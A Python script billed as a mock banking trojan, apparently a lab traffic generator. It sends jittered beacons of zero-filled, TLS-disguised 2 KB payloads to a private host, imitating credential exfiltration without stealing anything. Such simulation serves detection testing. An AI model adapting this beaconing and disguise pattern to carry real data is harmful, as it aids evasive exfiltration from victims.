#!/usr/bin/env python3
"""
Mock banking trojan.
Beacon every 30s, upload 2 KB credential payload each time.
"""
import socket, time, random, argparse

ap = argparse.ArgumentParser()
ap.add_argument('--host', default='192.168.56.103')
ap.add_argument('--port', type=int, default=8000)
ap.add_argument('--interval', type=float, default=30)
ap.add_argument('--jitter', type=float, default=0.15)
ap.add_argument('--n-events', type=int, default=20)
ap.add_argument('--payload-min', type=int, default=1800)
ap.add_argument('--payload-max', type=int, default=2500)
a = ap.parse_args()

print(f'[banking_trojan] {a.host}:{a.port} x{a.n_events} interval={a.interval}s')

for i in range(a.n_events):
    size = random.randint(a.payload_min, a.payload_max)
    payload = b'\x16\x03\x03' + bytes([(size >> 8) & 0xff, size & 0xff]) + b'\x00' * (size - 5)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((a.host, a.port))
        s.sendall(payload)
        s.shutdown(socket.SHUT_WR)
        try:
            while s.recv(4096):
                pass
        except Exception:
            pass
        s.close()
        print(f'  [{i+1}/{a.n_events}] sent {size} B')
    except Exception as e:
        print(f'  [{i+1}/{a.n_events}] err: {e}')

    if i < a.n_events - 1:
        base = a.interval
        j = base * a.jitter
        sleep_for = max(1.0, base + random.uniform(-j, j))
        time.sleep(sleep_for)
